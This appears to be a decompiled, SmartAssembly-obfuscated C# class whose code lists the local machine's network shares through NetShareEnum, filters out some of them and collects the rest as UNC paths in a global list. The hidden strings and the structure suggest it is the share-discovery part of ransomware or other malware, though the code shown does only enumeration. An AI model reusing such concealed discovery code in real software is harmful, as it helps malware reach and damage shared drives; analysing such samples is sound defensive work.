using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace frgoWklvEOSV;

public sealed class XPNBcIVPaeWD
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct iMTharBJKhHAT
	{
		public string BXplBbMTIqBMo;

		public uint QiMcUrzxUmNr;

		public string DfNBoJjGXQHZg;

		public iMTharBJKhHAT(string string_0, uint uint_0, string string_1)
		{
			BXplBbMTIqBMo = string_0;
			QiMcUrzxUmNr = uint_0;
			DfNBoJjGXQHZg = string_1;
		}

		public override string ToString()
		{
			return BXplBbMTIqBMo;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	public iMTharBJKhHAT[] NIkJgFtbSQwcb(string string_0)
	{
		List<iMTharBJKhHAT> list = new List<iMTharBJKhHAT>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(iMTharBJKhHAT));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				iMTharBJKhHAT item = (iMTharBJKhHAT)Marshal.PtrToStructure(ptr, typeof(iMTharBJKhHAT));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new iMTharBJKhHAT(getString_0(107398303) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static void UUAImYiDYfe()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			iMTharBJKhHAT[] array = new XPNBcIVPaeWD().NIkJgFtbSQwcb(Environment.MachineName);
			iMTharBJKhHAT[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				iMTharBJKhHAT iMTharBJKhHAT = array2[i];
				if (iMTharBJKhHAT.ToString().Contains(getString_0(107398262)) || iMTharBJKhHAT.ToString().Contains(getString_0(107398253)) || iMTharBJKhHAT.ToString().Contains(getString_0(107398276)) || iMTharBJKhHAT.ToString().Contains(getString_0(107387720)) || logicalDrives.Contains(iMTharBJKhHAT.ToString().Replace(getString_0(107402740), getString_0(107398235))))
				{
					continue;
				}
				if (!GRQFeQGQfBG.HoHveMjVjvX.Contains(getString_0(107387707) + Environment.MachineName + getString_0(107397264) + iMTharBJKhHAT))
				{
					GRQFeQGQfBG.HoHveMjVjvX.Add(getString_0(107387707) + Environment.MachineName + getString_0(107397264) + iMTharBJKhHAT);
				}
				if (GRQFeQGQfBG.qoRjYABduZF)
				{
					try
					{
						Console.WriteLine(getString_0(107398230), getString_0(107387707) + Environment.MachineName + getString_0(107397264) + iMTharBJKhHAT);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (GRQFeQGQfBG.joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(GRQFeQGQfBG.jnRLNtXuRRg, getString_0(107398237) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static XPNBcIVPaeWD()
	{
		Strings.CreateGetStringDelegate(typeof(XPNBcIVPaeWD));
	}
}
